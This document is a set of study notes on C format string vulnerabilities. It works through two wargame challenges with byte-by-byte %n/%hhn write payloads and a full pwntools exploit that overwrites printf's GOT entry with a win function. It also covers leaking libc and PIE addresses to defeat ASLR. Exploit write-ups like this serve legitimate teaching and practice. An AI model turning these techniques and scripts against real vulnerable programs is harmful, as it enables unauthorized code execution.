## Format String Vulns

### What is a format string? 
A string with placeholders in it. In C, the placeholders look like `%[dns]` Each of them is treated as an argument. 

### When do format string bugs occur?
When the user is able to control the format string

```C
//User controlled format string is put into printf
//They can enter a string which is treated as a format string i.e. User can make buf look like % s %s % s
char buf[100]
fgets(buf, sizeof(buf), stdin)
printf(buf)
```
	
### How do we identify format string vulnerabilities (quickly)?
Pass in a bunch of %x, %d etc. and see if some stack addresses are printed. (Note: stack addresses look like f7…)
**Slower way** : In binary ninja, you can see that we are giving the address of the buffer to printf as a format string. 

### How do format strings work?

In stack view, a call to a `printf` function creates a new stack frame. All its arguments are just below the return address. Since `printf` doesn't know how many 
arguments it has, specifying %x will fetch random arguments from the stack (below printf's return address)

### Leaking information (%s)

**Wargame - door**
Enter `AAAA %x %x` to test for format string vuln
```You say, AAAA 41000001 20414141```

Align this by 1 byte. so entering `zAAAA %x %x` 
```You say, zAAAA 7a000001 41414141```
This is equivalent to `zAAAA%2$x` meaning 1 byte padding and we are accessing the 2nd argument in the printf statement. (i.e. the 2nd %x symbol)

From the binary, we see that user input is being compared to "APES"
```
lea     eax, [ebp-0x9 {var_d}]
push    eax {var_d} {var_218_1}
lea     eax, [ebx-0x15c6]  {data_9f6, "APES"}
push    eax  {data_9f6, "APES"}
call    strncmp
```

Also, a target address has been provided. This is at ebp-0x9 which is convebient since that is the user input variable given to strncmp.
So we need to change this to APES.

`%n` writes the number of bytes it read to target address in memory. Using this, we will write APES.

Steps to craft payload:
1. Write the padding +  target addresses
```python
payload = b' '
payload += p32(target_addr) + p32(target_addr + 1) + p32(target_addr + 2) + p32(target_addr + 3)
```
2. Write the letters. For example: ord('A') = 65 which is the ASCII value of A. The number of bytes written so far is length of existing payload.
We subtract 65 bytes from this to get a total padding equal to 65.
```python
written_so_far = len(payload) - ord('A')
payload += f'%{written_so_far}x%2$hhn'.encode()
```
Similarly for P
```python
written_till_A = ord('P') - ord('A')
payload += f'%{written_till_A}x%3$hhn'.encode()
```
ord('E') is 0x69. We have already written more than 0x69 bytes of characters. So we use 0x100 (256 bytes) + ord('E') (69 bytes) = 325 bytes total.
We use `hh` to to truncate the value and still keep it as 0x69.

```python
written_till_P = 0x100 + ord('E') - ord('P')
payload += f'%{written_till_P}x%4$hhn'.encode()

written_till_E = 0x100 + ord('S') - ord('E')
payload += f'%{written_till_E}x%5$hhn'.encode()
```

**Wargame - formatrix**
Exploit idea - Since no RELRO is enabled we can replace a GOT table function call address with address to the win function. NX is enabled which means we can't place shellcode on the stack but that
doesn't matter in this scenario.

Win address is at 0x0x08048536 (use disass win in gdb). Will overwrite the call to the last printf statement with this address.
```
0x080486d9 <+359>:	call   0x80483b0 <printf@plt>
0x080486de <+364>:	add    esp,0x10
0x080486e1 <+367>:	mov    eax,0x0
0x080486e6 <+372>:	lea    esp,[ebp-0x8]
0x080486e9 <+375>:	pop    ecx
0x080486ea <+376>:	pop    ebx
0x080486eb <+377>:	pop    ebp
0x080486ec <+378>:	lea    esp,[ecx-0x4]
0x080486ef <+381>:	ret
```
```
pwndbg> disass 0x80483b0
        Dump of assembler code for function printf@plt:
           0x080483b0 <+0>:	jmp    DWORD PTR ds:0x8049c18
           0x080483b6 <+6>:	push   0x8
           0x080483bb <+11>:	jmp    0x8048390
        End of assembler dump.
pwndbg> x 0x8049c18
        0x8049c18 <printf@got.plt>:	0x080483b6
```
Note that our taregt address 0x8049c18 is located in the got.plt table.

Entering AAAA %x %x %x %x %x %x (or === AAAA%3$x), we get
`AAAA f7f8e580 804858c 41414141 66376620 38356538 30382030 38353834 3134206` 
This means that no padding is necessary since our buffer is already 4 byte aligned in the 3rd argument of printf.

Final exploit
```python
from pwn import *

PROGNAME = "./formatrix"
REMOTEIP = ""
REMOTEPORT = 24103

if args.REMOTE:
    p = remote(REMOTEIP, REMOTEPORT)
    elf = ELF(PROGNAME)
else:
    p = process(PROGNAME)
    elf = p.elf

def get_n(new, prev, size):
    while new <= prev:
        new += (1 << size)
    return new-prev

#Function that returns payload = <base_addr> + <base_addr + 1> + <base_addr + 2> + <base_addr + 3>
def gen_addrs(base_addr):
    addrs = b''
    for i in range(4):
        addrs += p32(base_addr + i)
    return addrs

#Function to return the format string
#Args - address to write, current payload length, printf stack 
def gen_format_writes(to_write, setup_len, stack_offset):
    payload = b''
    n_val = [setup_len]
    for i in range(4):
        n_val += [get_n(to_write[i], sum(n_val[:i+1]), 8)]
        payload += '%{}c'.format(n_val[i+1]).encode()
        payload += '%{}$hhn'.format(stack_offset + i).encode()
        print("Payload part " + str(i) + " = " + str(payload) )
    return payload

#win_addr is 0x08048536
win_addr = [c for c in p32(0x08048536)] #[54, 133, 4, 8]

#Target address
target_addr = 0x08049c18

payload = gen_addrs(target_addr)
log.info("Target addr = " + str(payload))

payload += gen_format_writes(win_addr, len(payload), 3)
log.info("After generating format writes = " + str(payload))

p.recvuntil('say: ')
p.sendline(payload)
p.interactive()

```

## Format strings automation
```python
fmtstr_payload(offset=12, writes{old_address: new_address})
```

## Types of Addresses Leaked & Offset Calculations
To see all possible outputs of format string, use a loop:

```python
e = ELF('./binary_name')

for i in range(20):
    io = e.process()
    io.sendline(f"AAAA %{i}$x")
    io.recvline()
    print(f"{i} - {io.recvline().strip()}")
    io.close()
```

1. The address containing 41414141 which identifies where the AAAA's are. These are the memory addresses that be can overwrite.
2. Addresses starting with `f7` are libc memory addresses. These can be used to calculate libc.address and defeat ASLR. First, calculate `offset`:
```
Leaked address of libc - Base Address (vmmap) = offset
gdb > p/x addr libc - base
gdb > $1 
```
We can now set `libc.address = Leaked address - offset`  
We can now use gadgets from libc: `libc.address + gadget offset`
3. Addresses starting with `56` are binary addresses which can be useful to calculate PIE offset. 
Use gdb to do this.
```
gdb > p/x Leaked address of binary - Base Address of binary = pie offset
gdb > $1
```
We can now set `elf.address = Leaked address - pie offset`
We can now use gadgets from the binary: `gadget offset  + pie offset`
We can now use functions from the GOT `exit_got = elf.got["exit"]`
Note: always ends in 000